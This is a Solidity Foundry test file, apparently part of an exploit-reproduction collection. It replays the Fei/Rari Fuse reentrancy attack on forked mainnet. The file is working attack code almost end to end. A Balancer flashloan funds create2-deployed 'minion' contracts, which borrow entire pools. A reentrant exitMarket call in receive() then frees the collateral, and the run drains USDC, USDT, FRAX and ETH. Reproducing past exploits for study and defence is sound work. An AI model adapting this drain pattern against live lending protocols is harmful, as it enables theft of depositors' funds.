// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {BalancerFlashloan} from "../../utils/BalancerFlashloan.sol";

import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
    function exitMarket(address market) external;

    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to unlimited borrowing.
    function borrowCaps(address market) external view returns(uint256);
}

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
}

interface IETHDelegator {
    function mint() external payable;
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function getCash() external view returns (uint256);
}

contract Exploit_Fei_Globals {
    IUnitroller public constant unitroller = IUnitroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);

    ICERC20Delegator public constant fUSDC = ICERC20Delegator(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    ICERC20Delegator public constant fUSDT = ICERC20Delegator(0xe097783483D1b7527152eF8B150B99B9B2700c8d);
    ICERC20Delegator public constant fFRAX = ICERC20Delegator(0x8922C1147E141C055fdDfc0ED5a119f3378c8ef8);

    IETHDelegator public constant fETH = IETHDelegator(0x26267e41CeCa7C8E0f143554Af707336f27Fa051);

    IWETH9 public constant weth =  IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 public constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 public constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 public constant frax = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);

    address public constant attacker = 0x6162759eDAd730152F0dF8115c698a42E666157F;
}

contract Exploit_Fei is TestHarness, BalancerFlashloan, Exploit_Fei_Globals {
    
    // This contract acts as the exploiter factory contract.
    function setUp() external {
        cheat.createSelectFork("mainnet", 14684813); // We pin one block before the exploit happened.

        cheat.label(attacker, "Attacker");
        cheat.label(address(this), "Attacker Factory");
    }

    // Start here, triggering the flashloan and the receiveFlashLoan callback.
    function test_attack() external {
        address[] memory _tokens = new address[](2);
        _tokens[0] = address(usdc);
        _tokens[1] = address(weth);

        uint256[] memory _amounts = new uint256[](2);
        _amounts[0] = 150000000000000;
        _amounts[1] = 50_000 ether;

        balancer.flashLoan(address(this), _tokens, _amounts, "");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens, 
        uint256[] memory amounts, 
        uint256[] memory , 
        bytes memory 
    ) external payable {
        require(msg.sender == address(balancer), "only callable by balancer");
        require(tokens.length == 2 && tokens.length == amounts.length, "length missmatch");
        require(address(tokens[0]) == address(usdc), "no usdc");
        require(address(tokens[1]) == address(weth), "no weth");

        uint256 balanceBeforeUSDC = usdc.balanceOf(address(this)) - amounts[0];
        uint256 balanceBeforeWETH = weth.balanceOf(address(this)) - amounts[1];

        uint256 usdcFlashLoanBalance = usdc.balanceOf(address(this));
        uint256 wethFlashLoanBalance = weth.balanceOf(address(this));
        
        console.log("\n---- STEP 0: Receive Flashloan ----");
        emit log_named_decimal_uint("USDC", usdcFlashLoanBalance, 8);
        emit log_named_decimal_uint("WETH", wethFlashLoanBalance, 18);

        // Start the reentrancy attack
        console.log("\n---- STEP 1: Attack with USDC (Minion #1) ----");
        address firstMinion = attack_fUSDC(usdcFlashLoanBalance, 1);
        console.log("\n After Redemption");
        console.log("Minion #1");
        log_balances(firstMinion);
        console.log("\n");
        console.log("Factory");
        log_balances(address(this));
       
        // For ether, performs the same sequence made before but from this contract handling WETH-ETH
        console.log("\n---- STEP 2: Attack with ETH (with factory) ----");
        attackfETH(wethFlashLoanBalance);

        console.log("\n---- STEP 3: Attack with USDC (Minion #2) ----");
        address secondMinion = attack_fUSDC(usdcFlashLoanBalance, 2);
        console.log("\n After Redemption");
        console.log("Minion #2");
        log_balances(secondMinion);
        console.log("\n");
        console.log("Factory");
        log_balances(address(this));

        // Redeem the whole amount
        fETH.redeemUnderlying(fETH.getCash());

        // Deposit ETH to get WETH back
        weth.deposit{value: 50_000 ether}();
        require(weth.balanceOf(address(this)) ==  50_000 ether, "error while depositing eth again");

        // Pay the flashloan back (no fees?)
        weth.transfer(address(balancer), 50_000 ether);
        usdc.transfer(address(balancer), 150000000000000);

        console.log("\n---- STEP 4: End of the attack ----");
        console.log("Factory Balances");
        emit log_named_decimal_uint("USDC", usdc.balanceOf(address(this)), 8);
        emit log_named_decimal_uint("USDT", usdt.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("FRAX", frax.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("WETH", wethFlashLoanBalance, 18);

        uint256 balanceAfterUSDC = usdc.balanceOf(address(this));
        uint256 balanceAfterWETH = weth.balanceOf(address(this));
        assertGe(balanceAfterUSDC, balanceBeforeUSDC);
        assertGe(balanceAfterWETH, balanceBeforeWETH);

    }

    function attackfETH(uint256 _wethFlashLoanBalance) internal {
    
        weth.approve(address(weth), type(uint256).max);
        weth.approve(address(fETH), type(uint256).max);

        weth.withdraw(_wethFlashLoanBalance);
        fETH.mint{value: _wethFlashLoanBalance}();

        // Enters fETH market to enable it as collateral
        address[] memory _cTokens = new address[](1); 
        _cTokens[0] = address(fETH);
        unitroller.enterMarkets(_cTokens); 

        // Borrows the balance of each market        
        fUSDC.borrow(usdc.balanceOf(address(fUSDC)));
        fUSDT.borrow(usdt.balanceOf(address(fUSDT)));
        fFRAX.borrow(frax.balanceOf(address(fFRAX)));
        
        console.log("\nAfter Borrowing");
        console.log("Factory");
        emit log_named_decimal_uint("USDC", usdc.balanceOf(address(this)), 8);
        emit log_named_decimal_uint("USDT", usdt.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("FRAX", frax.balanceOf(address(this)), 18);

    }

    // Commander function to the contracts created with create2
    function attack_fUSDC(uint256 usdcloanBalance, uint256 _salt) public returns (address) {
        // The factory deploys a minion contract that interacts with FEI
        Exploiter_Attacker_Minion attackerMinion = new Exploiter_Attacker_Minion{salt: bytes32(_salt)}(usdcloanBalance); 

        // Transfers the USDC to the Minion
        require(usdc.transfer(address(attackerMinion), usdcloanBalance), "usdc transfer failed");
        require(usdc.balanceOf(address(attackerMinion)) == usdcloanBalance, "wrong usdc balance");
        require(attackerMinion.factory() == address(this), "factory not initialized on minion");

        // Calls setup on minion (named like so to prevent collision with foundry's)
        // 1st Chain of calls to FEI
        attackerMinion.exploiter_setup_function();

        // Mints
        attackerMinion.mint();

        console.log("\nAfter Minting");
        console.log("Minion");
        log_balances(address(attackerMinion));
        console.log("\n");
        console.log("Factory");
        log_balances(address(this));

        // With fETH and already entered the market, we can borrow.
        attackerMinion.borrow();
        
        console.log("\nAfter Borrowing");
        console.log("Minion");
        log_balances(address(attackerMinion));
        console.log("\n");
        console.log("Factory");
        log_balances(address(this));

        // Trigger the redemptiom
        attackerMinion.redeemAll();

        return address(attackerMinion);
    }

    receive() external payable {

    }
    
    function log_balances(address contractAddr) internal {
        emit log_named_decimal_uint("USDC", usdc.balanceOf(contractAddr), 8);
        emit log_named_decimal_uint("fUSDC", fUSDC.balanceOf(contractAddr), fUSDC.decimals());
        emit log_named_decimal_uint("ETH", contractAddr.balance, 18);
    }
   

}

contract Exploiter_Attacker_Minion is Exploit_Fei_Globals {
    uint256 internal mintAmount;
    address public factory;

    constructor(uint256 _amountToMint){
        mintAmount = _amountToMint;
        factory = msg.sender;
    }

    function exploiter_setup_function() public {
        // First enters the USDC borrow market
        address[] memory _cTokens = new address[](1); 
        _cTokens[0] = address(fUSDC);
        unitroller.enterMarkets(_cTokens);
    }

    function mint() public returns(uint256 fUSDC_minted){
        // Gives Approval so the mint succeeds
        usdc.approve(address(fUSDC), type(uint256).max);

        fUSDC.mint(mintAmount);
        fUSDC.accrueInterest();
        fUSDC_minted = fUSDC.balanceOf(address(this));
    }

    function borrow() public {
        fUSDC.approve(address(fETH), type(uint256).max);
        fETH.borrow(address(fETH).balance); // Borrow the whole balance of the pool
    }

    function redeemAll() public returns(uint256){
        fUSDC.approve(address(fUSDC), type(uint256).max);
        fUSDC.redeemUnderlying(mintAmount);
        uint256 usdcBalanceAfterRedemption = usdc.balanceOf(address(this));
        usdc.transfer(factory, usdcBalanceAfterRedemption);

        // This call triggers the reentrancy chain commanded from the factory.
        (bool success, ) = payable(factory).call{value: address(this).balance}(""); 
        require(success, "low level call faileddd");

        return usdcBalanceAfterRedemption;
    }
    receive() external payable{
      unitroller.exitMarket(address(fUSDC)); // Reentrant call to unitroller
    }
}
